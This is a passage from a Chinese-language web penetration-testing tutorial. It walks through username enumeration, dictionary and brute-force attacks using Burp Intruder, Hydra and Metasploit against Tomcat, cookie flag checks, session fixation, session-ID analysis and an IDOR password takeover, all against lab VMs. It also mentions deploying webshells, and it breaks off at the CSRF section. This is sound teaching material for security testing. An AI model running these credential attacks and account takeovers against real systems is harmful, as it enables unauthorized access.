# 第四章：测试身份验证和会话管理

在本章中，我们将覆盖：

+   用户名枚举

+   使用 Burp Suite 对登录页面进行字典攻击

+   使用 Hydra 强力破解基础身份验证

+   使用 Metasploit 攻击 Tomcat 的密码

+   手动识别 Cookie 中的漏洞

+   攻击会话固定漏洞

+   使用 Burp Sequencer 评估会话标识符的质量

+   滥用不安全的直接对象引用

+   执行跨站请求伪造攻击

# 介绍

当应用程序管理的信息不应公开时，需要一个机制来验证用户是否允许查看某些数据；这就是 **身份验证**。如今，web 应用程序中最常见的身份验证方法是使用用户名或标识符与秘密密码的组合。

HTTP 是一种无状态协议，这意味着它将所有请求视为独立的，并且没有办法将两者关联为属于同一个用户，因此应用程序还需要一种区分不同用户请求的方式，并允许他们执行可能需要一系列由同一用户完成的请求，或者同时由多个用户连接执行的任务。这被称为 **会话管理**。Cookie 中的会话标识符是现代 web 应用程序中最常用的会话管理方法，尽管在某些类型的应用程序（如后台 web 服务）中，Bearer Token（包含用户身份信息的值，通常通过每个请求的 `Authorization` 头部发送）也在不断流行起来。

在本章中，我们将介绍检测 web 应用程序身份验证和会话管理中一些最常见漏洞的步骤，以及攻击者如何利用这些漏洞来获取受限信息的方式。

# 用户名枚举

战胜常见的用户/密码认证机制的第一步是发现有效的用户名。实现这一点的一种方法是枚举；在 web 应用程序中枚举用户是通过分析当用户名在登录、注册和密码恢复页面提交时的响应来完成的。

在这个实验中，我们将使用一个常见用户名列表，向应用程序提交多个请求，并通过比较响应来找出哪些提交的名字属于现有用户。

# 准备工作

对于这个实验，我们将在易受攻击的虚拟机 `vm_1` 中使用 WebGoat 应用程序，并将 Burp Suite 作为代理连接我们的 Kali Linux 浏览器。

# 如何做…

几乎所有应用程序都提供用户在忘记密码时恢复或重置密码的功能。并且在这些应用程序中，通常会显示当提供了一个不存在的用户名时，这可以用来推断出一个有效用户名列表：

1.  从 Kali Linux 中，浏览到 WebGoat（`http://192.168.56.11/WebGoat/attack`），如果弹出登录对话框，请使用 `webgoat` 作为用户名和密码。

1.  进入 WebGoat 后，转到身份验证缺陷 | 忘记密码。如果我们提交任何随机的用户名，而该用户在数据库中不存在，我们将收到一条消息，提示该用户名无效：

![](img/8baf0541-9d22-4eae-a1bd-d8d3450adbbf.png)

1.  然后我们可以假设当提供有效用户名时，响应会有所不同。为了验证这一点，将请求发送到 Intruder。在 Burp 的历史记录中，它应该是一个 `POST` 请求，指向 `http://192.168.56.11/WebGoat/attack?Screen=64&menu=500`。

1.  进入 Intruder 后，将用户名设置为唯一的插入位置：

![](img/7940ce04-40fa-4c6a-8e5b-2a525323630e.png)

1.  然后，转到 Payloads 设置我们将在攻击中使用的用户名列表。将类型保持为 Simple List，并点击加载按钮加载 ` /usr/share/wordlists/metasploit/http_default_users.txt` 文件：

![](img/69138945-5c36-470a-baef-923c662c94d1.png)

1.  现在我们知道当用户不存在时的消息后，可以使用 Burp 来告诉我们该消息何时出现在结果中。进入选项 | Grep - Match 并清除列表。

1.  添加一个新的字符串来匹配 `Not a valid username`：

![](img/3287dab6-be24-4047-b142-0aaade525fe4.png)

1.  现在，开始攻击。注意一些用户名，例如 `admin`，它们的无效用户名消息没有被 Burp Suite 标记；这些就是应用程序中有效的用户名：

![](img/40ce6475-0bee-45ef-b7f6-e7ffa5428302.png)

# 它是如何工作的...

如果我们正在测试一个需要用户名和密码才能执行任何操作的 Web 应用程序，我们需要评估攻击者可能如何发现有效的用户名和密码。登录、注册和密码恢复页面中对于有效和无效用户响应的最细微差异，都能让我们找到第一条信息。

分析对相似请求的响应差异是我们作为渗透测试人员始终会执行的任务。在这里，我们使用了 Burp Suite 的工具，例如代理来记录原始请求，使用 Intruder 多次发送请求并改变变量（用户名）的值。Intruder 还允许我们自动搜索字符串，并告诉我们该字符串在响应中出现的位置。

# 使用 Burp Suite 进行登录页面的字典攻击

一旦我们获得了目标应用程序的有效用户名列表，就可以尝试暴力破解攻击，它会尝试所有可能的字符组合，直到找到有效密码。由于字符组合的巨大数量以及客户端与服务器之间的响应时间，暴力破解攻击在 Web 应用程序中是不可行的。

更实际的解决方案是字典攻击，它使用一个经过精简的高概率密码列表，并尝试与有效用户名组合。

在本教程中，我们将使用 Burp Suite Intruder 来尝试在登录页面上进行字典攻击。

# 如何操作...

我们将使用 WackoPicko 管理员部分的登录来测试此攻击：

1.  首先，我们将 Burp Suite 设置为代理我们的浏览器。

1.  浏览到`http://192.168.56.102/WackoPicko/admin/index.php?page=login`。

1.  我们会看到一个登录表单。让我们尝试`test`作为用户名和密码。

1.  现在，转到 Proxy 的历史记录，查找我们刚刚用来登录尝试的`POST`请求，并将其发送到 Intruder。

1.  点击“Clear §”以清除预选的插入位置。

1.  现在，我们通过高亮显示两个`POST`参数（`adminname`和`password`）的值，并点击“Add §”来添加插入位置：

1.  由于我们希望将密码列表尝试应用到所有用户，我们选择 Cluster bomb 作为攻击类型：

![](img/f37456a1-ed4e-4dbf-98c9-111d986b7e3b.png)

1.  下一步是定义 Intruder 将测试的输入值。转到 Payloads 选项卡。

1.  在 Payload Options [Simple list]部分的文本框中，添加以下名称：

    +   `user`

    +   `john`

    +   `admin`

    +   `alice`

    +   `bob`

    +   `administrator`

![](img/8f671aca-19b3-46b5-8c67-4219ef59c898.png)

1.  现在，从 Payload set 框中选择列表 2。这个列表将是我们的密码列表，我们将使用 2017 年最常见的 25 个密码进行此练习（[`time.com/5071176/worst-passwords-2017/`](http://time.com/5071176/worst-passwords-2017/)）：

![](img/75f20419-7676-4492-9abf-c82229dd0c6b.png)

1.  启动攻击。我们可以看到，除了一条外，所有响应的长度似乎都相同：`admin`/`admin`组合的状态是 303（重定向）且长度较小。如果我们检查它，会发现它是重定向到管理员主页：

![](img/b8db4135-d63d-40ca-b63c-980f3a055b8f.png)

# 它是如何工作的...

至于结果，我们可以看到所有失败的登录尝试都得到了相同的响应，但其中有一个返回状态 200（OK），且长度为 813 字节，因此我们推测，成功的请求至少在长度上会有所不同（因为它需要重定向或将用户发送到主页）。如果成功和失败的请求长度相同，我们也可以检查状态码，或使用搜索框查找响应中的特定模式。

# 还有更多...

Kali Linux 包含一组非常有用的密码字典和词汇表，存储在`/usr/share/wordlists`目录中。你会在那里找到一些文件，如下所示：

+   `rockyou.tar.gz`：RockYou 网站于 2010 年 12 月被黑客攻击，超过 1400 万个密码被泄露，这个列表包含了这些密码。这些密码存储在该文件中，因此在使用之前需要解压：

```
tar -xzf rockyou.tar.gz
```

+   `dnsmap.txt`：包含常见的子域名，如`intranet`、`ftp`或`www`；在暴力破解 DNS 服务器时非常有用。

+   `/dirbuster/*`：`dirbuster`目录包含常见 Web 服务器文件的名称；这些文件可以在使用 DirBuster 或 OWASP-ZAP 的强制浏览时使用。

+   `/wfuzz/*`：在此目录中，我们可以找到用于 Web 攻击和暴力破解文件的大量模糊字符串。

+   `/metasploit/*`：该目录包含 Metasploit 框架插件使用的所有默认字典。它包含多个服务、主机名、用户名、文件名等的默认密码字典。

# 使用 Hydra 进行基本认证的暴力破解

THC Hydra（简称 Hydra）是一个网络在线登录破解工具；这意味着它可以通过暴力破解活跃的网络服务来查找登录密码。在 Hydra 支持的众多服务中，我们可以找到 HTTP 表单登录和 HTTP 基本认证。

在 HTTP 基本认证中，浏览器会将用户名和密码使用 base64 编码后发送到`Authorization`头部。例如，如果用户名是`admin`，密码是`Password`，浏览器会将`admin:Password`编码为`*YWRtaW46UGFzc3dvcmQ=*`，然后请求头中会包含如下内容：

```
Authorization: Basic YWRtaW46UGFzc3dvcmQ=
```

几乎每次我们看到一个看似随机的字母数字字符串，并以一个或两个等号（=）符号结尾时，这个字符串都是 base64 编码的。我们可以轻松地使用 Burp Suite 的 Decoder 或 Kali Linux 中的`base64`命令来解码它。`=`符号可能会被编码为 URL 友好形式，即在某些请求和响应中会被替换为`%3D`。

在前面的教程中，我们使用了 Burp Suite 的 Intruder 来攻击登录表单；在本教程中，我们将使用 THC Hydra 来攻击另一种登录机制——HTTP 基本认证。

# 准备工作

除了我们在前面的教程中使用的密码列表外，为了执行这个字典攻击，我们还需要一个用户名列表。我们假设已经进行了侦察，并获得了几个有效的用户名。创建一个文本文件（我们将其命名为`user_list.txt`），其中包含以下内容：

```
user
john
admin
alice
bob
administrator
user
webgoat
adam
sample
```

# 如何操作...

在我们 Kali Linux 虚拟机中存放用户名和密码字典的目录下，我们执行以下操作：

1.  打开终端并运行`hydra`，或者在 Kali Linux 的应用程序菜单中选择 Applications | 05 - 密码攻击 | 在线攻击 | Hydra。

1.  输入没有参数的命令会显示基本的帮助信息：

![](img/0d2669ca-f425-4b6b-a51a-1ffe33f97b83.png)

在这里，我们可以看到一些有用的信息，帮助我们完成目标。通过使用`-L`选项，我们可以使用包含可能用户名的文件。`-P`允许我们使用密码字典。我们需要在命令后加上我们要攻击的服务，后接`://`和服务器地址，最后可选加上端口号和服务选项。

1.  在终端中，输入以下命令以执行攻击：

```
hydra -L user_list.txt -P top25_passwords.txt -u -e ns http-get://192.168.56.11/WebGoat
```

![](img/edbc5a52-c3d6-45d4-a51b-84fa649fd3aa.png)

Hydra 找到两个不同的用户名/密码组合，成功登录到服务器。

# 它是如何工作的...

与其他身份验证方法（如基于表单的认证）不同，基本身份验证在发送给服务器的内容、发送方式以及期望的响应上是标准化的。这使得攻击者和渗透测试人员可以节省宝贵的分析时间，不用关注哪些参数包含用户名和密码，如何处理和发送它们，以及如何区分成功和失败的响应。这是基本身份验证被认为不安全的众多原因之一。

在调用 Hydra 时，我们使用了一些参数：

+   `-L user_list.txt` 告诉 Hydra 从 `user_list.txt` 文件中获取用户名。

+   `-P top25_passwords.txt` 告诉 Hydra 从 `top25_passwords.txt` 文件中获取可能的密码。

+   `-u`—Hydra 将首先遍历用户名，而不是密码。这意味着 Hydra 将首先尝试所有用户名与一个密码的组合，然后再尝试下一个密码。这在某些情况下有助于防止账户被锁定。

+   `-e ns`—Hydra 会尝试空密码（`n`）和用户名作为密码（`s`），以及提供的密码列表。

+   `http-get` 表示 Hydra 将针对 HTTP 基本身份验证执行 `GET` 请求。

+   服务后跟着 `://` 和目标服务器（`192.168.56.11`）。接下来的 `/` 后是服务器的选项，在本例中是请求身份验证的 URL。端口未指定，Hydra 将尝试默认的 TCP `80`。

# 还有更多……

不建议在生产服务器上执行暴力破解攻击或字典攻击，特别是在密码数量较多的情况下，因为这样可能会导致服务中断、有效用户被阻止，或者被客户的保护机制封锁。

作为渗透测试人员，建议每个用户执行此类攻击时最多进行四次登录尝试，以避免被阻止；例如，我们可以像这里一样尝试 `-e ns`，并添加 `-p 123456` 来覆盖三种可能性：没有密码、密码与用户名相同，以及密码是 `123456`，这是全球最常见的密码之一。

# 另请参见

到目前为止，我们已经在 web 应用程序中看到两种身份验证方法，即基于表单的身份验证和基本身份验证。这些并不是开发人员使用的唯一方法；建议读者进一步调查其他方法的优缺点，以及可能的实现失败，例如：

+   **摘要认证**：这种认证方法比基本认证更加安全。客户端不会直接将用户名和密码编码在请求头中，而是计算由服务器提供的一个称为 nonce 的值与其凭证一起的 MD5 哈希值，并将此哈希值发送到服务器。服务器已经知道 nonce、用户名和密码，并可以重新计算哈希并比较两个值。

+   **NTLM/Windows 认证**：与摘要认证遵循相同原理，NTLM 认证使用 Windows 凭证和 NTLM 哈希算法来处理服务器提供的挑战。该方案需要多次请求-响应交换，且服务器和任何中间代理必须支持持久连接。

+   **Kerberos 认证**：该认证方案利用 Kerberos 协议来进行服务器认证。与 NTLM 一样，它不要求输入用户名和密码，而是使用 Windows 凭证进行登录。

+   **Bearer Token（持有者令牌）**：持有者令牌是一种特殊值，通常是一个随机生成的长字符串或一个经过加密哈希函数签名的 base64 编码数据结构，它授予任何向服务器提供该令牌的客户端访问权限。

# 使用 Metasploit 攻击 Tomcat 的密码

Apache Tomcat 是全球最广泛使用的 Java Web 应用服务器之一。通常可以发现 Tomcat 服务器存在一些默认配置。在这些配置中，惊人地常见的是服务器暴露了管理应用程序，即允许管理员启动、停止、添加和删除服务器中的应用程序的那个应用程序。

在本教程中，我们将使用 Metasploit 模块对 Tomcat 服务器执行字典攻击，以便获得其管理应用的访问权限。

# 准备中

如果这是你第一次运行 Metasploit Framework，你需要启动数据库服务并初始化它。Metasploit 使用 PostgreSQL 数据库来存储日志和结果，所以我们首先要做的是启动服务：

```
service postgresql start
```

然后，我们使用 Metasploit 数据库工具来创建并初始化数据库：

```
msfdb init
```

然后，我们启动 Metasploit 控制台：

```
msfconsole
```

![](img/876cafce-d3dc-4884-8273-bcf4de22fd54.png)

# 如何操作...

我们可以使用 Hydra 或 Burp Suite 来攻击 Tomcat 服务器，但遇到某些不如预期的情况时，能够有备用的解决方案，并使用其他工具，应该是任何优秀渗透测试人员的技能之一。所以，我们在本教程中将使用 Metasploit：

1.  漏洞虚拟机 `vm_1` 上运行着一个 Tomcat 服务器，端口为 `8080`。浏览器访问 `http://192.168.56.11:8080/manager/html`：

![](img/f7c85495-777f-4131-b9e8-f1f6a3a1f905.png)

1.  我们得到一个基本认证弹窗，要求输入用户名和密码。

1.  打开终端并启动 Metasploit 控制台：

```
msfconsole
```

1.  启动完成后，我们需要加载合适的模块。在 `msf>` 提示符下输入以下内容：

```
use auxiliary/scanner/http/tomcat_mgr_login
```

1.  我们可能想查看它使用的参数：

```
show options
```

1.  现在，我们设置目标主机；在这种情况下，只有一个目标：

```
set rhosts 192.168.56.11
```

1.  为了让它运行得稍微快一点，但又不至于太快，我们增加线程数。这意味着并行发送请求：

```
set threads 5
```

1.  同时，我们不希望由于请求过多导致服务器崩溃，因此我们降低了暴力破解速度：

```
set bruteforce_speed 3
```

![](img/556790f7-e7a8-4b81-84e3-94c4d97075f1.png)

1.  其余的参数与我们的案例一样工作，所以我们现在运行攻击：

```
run
```

1.  在几次尝试失败后，我们会找到一个有效的密码，那个被绿色 `[+]` 符号标记的密码：

![](img/fddc467d-77fb-43cc-946f-694d57702340.png)

# 它是如何工作的...

默认情况下，Tomcat 使用 TCP 端口 `8080`，并且其管理应用位于 `/manager/html`。该应用使用基本的 HTTP 身份验证。我们刚才使用的 Metasploit 辅助模块（`tomcat_mgr_login`）有一些配置选项值得在这里提到：

+   `BLANK_PASSWORDS`：为每个测试的用户添加一个空密码的测试

+   `PASSWORD`：如果我们想测试一个密码在多个用户下的有效性，或是添加一个列表中未包含的特定密码，这个选项很有用。

+   `PASS_FILE`：我们将在测试中使用的密码列表

+   `Proxies`：如果我们需要通过代理访问目标，或为了避免被检测到，我们需要配置此选项

+   `RHOSTS`：我们想要测试的主机、主机列表（用空格分隔）或包含主机的文件（`file: /path/to/file/with/hosts`）

+   `RPORT`：Tomcat 在主机上使用的 TCP 端口

+   `STOP_ON_SUCCESS`：当找到有效密码时停止对主机的进一步尝试

+   `TARGERURI`：主机内管理应用的位置

+   `USERNAME`：定义一个特定的用户名进行测试；它可以单独测试或添加到 `USER_FILE` 中定义的列表中

+   `USER_PASS_FILE`：包含用户名/密码组合的文件，用于测试

+   `USER_AS_PASS`：将列表中的每个用户名作为其密码进行尝试

# 还有更多...

一旦我们获得了对 Tomcat 服务器的访问权限，我们可以查看并操作（启动、停止、重启和删除）安装在其中的应用程序：

![](img/127d10f1-309e-4a54-ab1a-1fbf472f6398.png)

此外，我们还可以上传自己的应用程序，包括那些在服务器上执行命令的应用程序。上传并部署一个 webshell 到服务器并在其中执行系统命令的练习留给读者自己完成。Kali Linux 在 `/usr/share/webshells` 中包含了许多有用的 webshell 源代码：

![](img/f4d29781-6664-47d9-87a7-0e9048f7bc90.png)

# 手动识别 Cookie 中的漏洞

Cookie 是服务器存储在客户端计算机中的信息，可以是持久性的也可以是临时的。在现代 Web 应用程序中，Cookie 是跟踪用户会话的最常见方式。通过将服务器生成的会话标识符保存在用户的计算机中，服务器能够区分同时来自不同客户端的请求。当任何请求发送到服务器时，浏览器会添加 Cookie，然后发送请求，这样服务器就可以根据 Cookie 区分会话。

在这个教程中，我们将看到如何识别 Cookie 中的常见漏洞，这些漏洞可能允许攻击者劫持有效用户的会话。

# 如何操作...

推荐在执行此示例之前删除所有 cookie。因为来自不同应用程序的 cookie 可能会混淆，所有这些应用程序都在同一服务器上，并且所有 cookie 都属于同一域：

1.  浏览到 `http://192.168.56.11/WackoPicko/`。

1.  我们可以使用 Cookies Manager 浏览器插件来检查 cookie 的值和参数。为此，只需点击插件图标，它将显示浏览器当前存储的所有 cookie。

1.  选择任何一个 cookie，例如来自域 `192.168.56.11` 的 `PHPSESSID`，然后双击它，或者点击编辑以打开新对话框查看并修改其所有参数：

![](img/fb1cba3a-bf3a-4406-9a53-f011e1603116.png)

`PHPSESSID` 是基于 PHP 的 web 应用程序中会话 cookie 的默认名称。通过查看该 cookie 中参数的值，我们可以看到它可以通过安全和不安全通道（HTTP 和 HTTPS）发送，并且可以通过服务器和客户端的脚本代码读取，因为它没有启用 Secure（通过“Send For: Any type of connection”参数可以看出）和 HTTP Only 标志。这意味着该应用程序中的会话可能会被劫持。

1.  我们还可以使用浏览器的开发者工具来查看和修改 cookie 值。打开开发者工具并进入存储：

![](img/ad9794e9-5bfb-44e8-852d-1d1c55f938eb.png)

在这个截图中，我们选择了一个名为 `session` 的 cookie，它仅对服务器上的 WackoPicko 目录有效（由 `Path` 参数指定）；当浏览器关闭时它会被清除（`Expires: "Session"`），并且与 `PHPSESSID` 一样，它没有启用 `HttpOnly` 和 `Secure` 标志，因此可以通过脚本访问（HttpOnly），并且可以通过 HTTP 或 HTTPS 传输（Secure）。

# 它是如何工作的...

在这个示例中，我们只是检查了一个 cookie 的一些值。虽然它不像其他示例那样引人注目，但在每次进行渗透测试时，检查 cookie 配置非常重要；配置错误的会话 cookie 会导致会话劫持攻击，并可能滥用可信用户的帐户。

如果一个 cookie 没有启用 `HTTPOnly` 标志，它可以被脚本读取，这意味着如果存在 **跨站脚本** (**XSS**) 漏洞（我们将在后面的章节中看到），攻击者将能够获取有效会话的标识符，并利用该值冒充真实用户在应用程序中的身份。

**Secure** 属性，或在 Cookie 管理器中选择“仅在加密连接中发送”，告诉浏览器仅通过加密通道发送或接收此 cookie。这意味着仅通过 HTTPS 连接发送。如果没有设置这个标志，攻击者可能会执行 **中间人攻击** (**MiTM**)，并迫使通信不加密，从而暴露会话 cookie 为明文，导致攻击者能够通过会话标识符冒充有效用户。

# 还有更多...

由于 `PHPSESSID` 是 PHP 会话 Cookie 的默认名称，其他平台也有已知的会话 Cookie 名称：

+   `ASP.NET_SessionId` 是 ASP .Net 会话 Cookie 的名称

+   `JSESSIONID` 是 JSP 实现的会话 Cookie

OWASP 提供了一篇关于安全会话 Cookie 的非常详尽的文章：[`www.owasp.org/index.php/Session_Management_Cheat_Sheet`](https://www.owasp.org/index.php/Session_Management_Cheat_Sheet)。

# 攻击会话固定漏洞

当用户加载应用程序的主页时，它会设置一个会话标识符，可以是 Cookie、令牌或内部变量；如果一旦用户登录应用程序并进入需要用户名和密码或其他身份验证的受限区域后，该标识符未发生更改，那么该应用程序可能会受到会话固定攻击的影响。

会话固定攻击发生在攻击者将一个会话 ID 强制分配给一个有效用户，然后该用户登录应用程序时，攻击者提供的 ID 没有被更改。这使得攻击者可以简单地使用相同的会话 ID 劫持用户的会话。

在本教程中，我们将通过使用易受攻击的虚拟机 `vm_1` 中的一个应用程序来学习会话固定攻击的过程。

# 如何操作...

WebGoat 提供了一个有些简单，但非常具说明性的会话固定练习。我们将利用它来展示如何执行这一攻击：

1.  在 Kali 虚拟机中，登录到 WebGoat 并在菜单中选择 Session Management Flaws | Session Fixation。

1.  我们处于攻击的第一阶段。描述中提到我们是攻击者，试图向受害者发送网络钓鱼邮件，以强制使用我们选择的会话 ID。将 HTML 代码中的 `href` 值替换为以下内容（请注意大小写，因为服务器对大小写敏感）：

```
/WebGoat/attack/?Screen=56&menu=1800&SID=fixedsessionID
```

![](img/b63138c4-4370-4142-a813-3ce168400300.png)

这里的重点是 `SID` 参数，它包含一个由我们（攻击者）控制的会话值。

1.  点击“发送邮件”进入第二阶段。

1.  在第二阶段，我们从受害者阅读恶意邮件的角度出发。如果你将鼠标悬停在 Goat Hills Financial 的链接上，你会注意到目标 URL 包含了我们作为攻击者设置的 `SID` 值：

![](img/6b01d3f9-77b8-48a6-9636-408043c723bb.png)

1.  点击链接进入第三阶段。

1.  现在受害者已在登录页面，使用提供的凭据登录。请注意地址栏中的 `SID` 值仍然是我们设置的那个：

![](img/d19bf421-2ab3-4331-8e54-f10c04ecb465.png)

1.  现在，在第四阶段，我们回到攻击者的视角，并且有一个链接指向 Goat Hills Financial；点击它进入登录页面。

1.  注意地址栏现在有了不同的`SID`值；如果我们在没有认证的情况下访问登录页面，情况就会如此。使用浏览器的开发者工具查找并更改登录表单的`action`参数，以使其包含我们为受害者建立的会话值：

![](img/d2cfc6ea-3ece-4dda-b6f1-30cd575f195e.png)

1.  当`SID`值发生变化时，点击登录；无需设置用户名或密码，因为这些字段没有经过验证：

![](img/c84eea11-7aed-4931-82b2-e4081ee2d698.png)

通过更改登录表单提交时使用的`SID`参数，我们欺骗了服务器，让它认为我们的请求来自一个有效的现有会话。

# 它是如何工作的...

在这个教程中，我们跟踪了一个涉及社交工程的攻击路径，通过向受害者发送一封包含恶意链接的邮件。这个链接利用了会话固定漏洞，攻击者应该在之前发现这个漏洞，并且当受害者用户登录应用时，会话 ID 保持由攻击者提供，并将其与用户关联；这使得攻击者能够在应用中操控自己的参数，以复制相同的 ID，从而劫持有效用户的会话。

# 使用 Burp Sequencer 评估会话标识符的质量

Burp Suite 的 Sequencer 向服务器请求数千个会话标识符（例如，通过重复登录请求），并分析响应以确定生成标识符的算法的随机性和加密强度。算法越强，攻击者越难以复制有效的 ID。

在这个教程中，我们将使用 Burp Sequencer 来分析两个不同应用程序的会话 ID 生成，并确定一个安全的会话 ID 生成算法的一些特性。

# 准备工作

我们将使用 WebGoat 和 RailsGoat（WebGoat 的 Ruby on Rails 框架版本）。这两个应用都可以在易受攻击的虚拟机（`vm_1`）中找到。

你需要在 RailsGoat 中创建一个用户；为此，请使用主页上的注册按钮。

# 如何操作...

我们将开始分析 RailsGoat 的会话 cookie。我们本可以使用任何`PHPSESSID`或`JSESSIONID`cookie，但我们将利用这个自定义值来审查额外的概念。配置你的浏览器以使用 Burp Suite 作为代理，并按照以下步骤操作：

1.  登录到 RailsGoat 并查看代理的历史记录，寻找一个设置会话 cookie 的响应。你应该看到`Set-Cookie`头，并且应该设置一个名为`_railsgoat_session`的 cookie。

1.  在这种情况下，这是一个针对`/railsgoat/session`的请求。右键点击 URL，或请求或响应的正文，并选择“发送到 Sequencer”：

![](img/0c3e56d6-af36-43ce-8d2d-d12fd639c290.png)

1.  在继续进行 Sequencer 分析之前，先看看会话 cookie 包含了什么内容。这个`_railsgoat_session` cookie 看起来像是一个 base64 编码的字符串，通过两个短横线（`--`）与十六进制字符串连接起来。我们将在本食谱的后续部分解释这一推断。选择 cookie 的值，右击它，选择“发送到解码器”。

1.  在解码器中，首先将其解码为 URL 格式，然后在第二行中，将其解码为 base64 格式：

![](img/82cdfc18-c854-4a00-ba43-5c97345a659a.png)

看起来 base64 编码中包含了三个字段：`session_id`，它是一个十六进制值，可能是一个哈希；`csrf_token`，它是用来防止**跨站请求伪造**（**CSRF**）攻击的一个值；以及`user_id`，它似乎只是两个字符，可能是一个顺序号。cookie 的其余部分（`--`之后的部分）不是 base64 编码的，看起来像是一个随机哈希。现在，我们对会话 ID 有了更多了解，也学到了一些关于编码和 Burp Suite 解码器的知识。

1.  让我们继续在 Sequencer 中的分析。在 Burp Suite 的 Sequencer 标签页中，确保选中了正确的请求和 cookie：

![](img/b2b6360f-a9f6-46ef-894d-b685b4324138.png)

1.  我们知道这个 cookie 是用 base64 编码的；在分析之前，进入分析选项并选择 Base64 解码。这样，Burp Suite 就会分析 cookie 中的解码信息。

1.  回到实时捕获标签页，点击开始实时捕获。会弹出一个新窗口，我们等待它完成。可能需要一些时间。

1.  完成后，点击现在分析：

![](img/70e32361-df92-4aa9-b733-59c7fc258aef.png)

我们可以看到这个 cookie 的质量极好，这意味着攻击者不容易猜测它。可以自由浏览所有的结果标签页。

1.  这是一个质量良好的会话 cookie 的示例；这次我们来看看一个质量较差的。登录 WebGoat 并进入会话管理漏洞 | 劫持会话。

1.  本次练习是关于通过劫持有效会话 ID 来绕过登录表单。尝试使用任意随机的用户名和密码进行登录，仅仅是为了让它被记录在 Burp Suite 中：

![](img/3ef404d9-ba39-45fc-86b4-0cf6a3a96426.png)

1.  在这种情况下，设置会话 cookie 的请求是首先加载练习的请求；在 Burp Suite 的历史记录中搜索`Set-Cookie: WEAKID=`响应头。这个 ID 仅仅是由短横线分隔的数字。

1.  发送请求到 Sequencer。

1.  选择`WEAKID` cookie 作为目标进行分析。

1.  开始实时捕获并等待其完成后执行分析：

![](img/41065b0d-2dba-449b-9310-f9f4634dc3e3.png)

对于这个 ID，我们可以看到质量极差。进入字符分析，我们可以更好地了解：

![](img/88ec218d-cb3c-44a3-bdf9-c6faf0b7d8e2.png)

这张图表展示了每个字符位置的变化或重要程度。我们看到从位置**2**到位置**3**，以及从**3**到**4**的重要性增加，然后在**5**处（即连字符的位置）再次下降。这表明 ID 的第一部分是递增的，第二部分也可能是递增的，但变化的速率不同。

# 它是如何工作的…

Burp Suite 的 Sequencer 对大量会话标识符（或我们提供的响应中的任何数据）进行不同的统计分析，以确定这些数据是否是随机生成的，还是可能存在可预测的模式，攻击者可以利用这种模式生成有效的 ID 并劫持会话。

首先，我们分析了一个复杂的会话 cookie，它由一个使用 base64 算法编码的数据结构和看似是 SHA-1 哈希组成。我们可以通过它包含大小写字母、数字，并且可能还包含加号（`+`）或斜杠（`/`），并且以 `%3D` 结尾（这是 `=` 的 URL 转义序列），从而判断第一部分是 base64 编码的。我们说 cookie 的第二部分是 SHA-1 哈希，因为它是一个由 40 位十六进制数字组成的字符串；每个十六进制数字代表 4 个比特，4 个比特 * 40 位 = 160 位；而 SHA-1 是最流行的 160 位哈希算法。

然后，我们分析了一个生成较弱的会话 ID。显然它是递增的，因为在十进制数字中，最右侧的位置的数字变化频率是其最左边相邻位置的十倍。ID 的第二部分，根据其长度和最重要的数字，暗示它是一个 Unix 时间戳（[`en.wikipedia.org/wiki/Unix_time`](https://en.wikipedia.org/wiki/Unix_time)）。

# 另请参见

深入研究`WEAKID`会话 cookie 的生成机制，尝试找出一种方法来发现活动的会话 cookie，以绕过登录。使用 Burp Suite 的 Repeater 和 Intruder 工具来帮助完成此任务。

要了解更多关于如何区分编码、哈希和加密的内容，可以查看这篇精彩的文章：[`danielmiessler.com/study/encoding-encryption-hashing-obfuscation/`](https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/)。

# 滥用不安全的直接对象引用

直接对象引用是指应用程序使用客户端提供的输入，通过名称或其他简单标识符访问服务器端资源，例如，使用文件参数在服务器中搜索特定文件并允许用户访问它。

如果应用程序没有正确验证用户提供的值，并且允许该用户访问资源，攻击者可以利用这一点绕过权限控制，访问该用户未授权的文件或信息。

在本例中，我们将分析并利用 RailsGoat 应用中的这一简单漏洞。

# 准备工作

对于本次练习，我们需要在 RailsGoat 中注册至少两个用户。其中一个是用户名为`user`的受害者，另一个是用户名为`attacker`的攻击者。

# 如何操作...

对于本次练习，最好我们知道两个用户的密码，尽管在真实场景中我们实际上只需要知道攻击者的密码。

配置浏览器使用 Burp Suite 作为代理，并执行以下操作：

1.  以`user`身份登录并进入账户设置；点击个人资料图片（右上角）和账户设置：

![](img/a3142d8a-3ff9-44df-a250-00f4a210c2ec.png)

注意，在我们的示例中，URL 显示为`users/7/account_settings`。这是否意味着数字`7`是用户 ID？

1.  登出并以`attacker`身份登录。

1.  再次进入账户设置，观察攻击者设置的 URL 是否有不同的数字。

1.  在 Burp Suite 中启用请求拦截。

1.  更改攻击者用户的密码。设置一个新密码，确认并点击提交。

1.  让我们分析拦截到的请求：

![](img/6379899b-3fa1-441c-856a-6cb5a3079221.png)

让我们关注截图中加下划线的部分。首先，请求是发送到一个`9.json`文件；`9`是攻击者账户设置 URL 中的数字，所以这可能是用户 ID。接下来，有一个`user%5Buser_id%50`参数（如果解码的话就是`user[user_id]`），其值为`9`，然后是`user%5Bemail%50`或解码后的`user[email]`。最后两个参数是密码和密码确认。

1.  那么，如果攻击者请求中所有关于用户`9`的引用没有得到正确验证，会怎么样呢？让我们尝试攻击受害者用户，其 ID 为`7`。

1.  作为攻击者，进行一次密码更改，并再次拦截请求。

1.  更改请求，将攻击者的 ID 替换为受害者的 ID，修改 URL 和`user_id`参数。

1.  更改请求的其余部分，参考截图中的加下划线值，或者选择自己的值：

![](img/68c61750-0b04-43f6-9a9a-bae791651a68.png)

1.  提交请求并验证其是否被接受（响应代码为 200，并且正文中有`success`消息）。

1.  登出并尝试使用原密码以受害者用户身份登录，登录将失败。

1.  现在，尝试使用攻击者请求中设置的密码，登录将会成功。

1.  进入账户设置并验证其他更改也已生效：

![](img/5d91d21c-1bdf-496f-a5a5-6ce21d0b4830.png)

# 工作原理...

在本例中，我们首先检查了用户账户设置的 URL，并注意到应用可能通过数字 ID 区分用户。然后，我们执行了一次更改用户信息的请求，并验证了数字标识符的使用。

接着，我们尝试替换用户的 ID，做出更改以影响其他用户，结果发现 RailsGoat 直接引用了包含用户信息的对象，并且仅通过请求正文中提供的用户 ID 来验证和进行更改。这样，作为攻击者，我们只需要知道受害者的 ID，就可以更改他们的信息，甚至是密码，从而让我们代表他们登录。

# 执行跨站请求伪造攻击（Cross-Site Request Forgery）

CSRF 攻击是让已认证用户在他们已认证的 web 应用程序中执行不想要的操作。通过用户访问的外部网站触发这些操作。

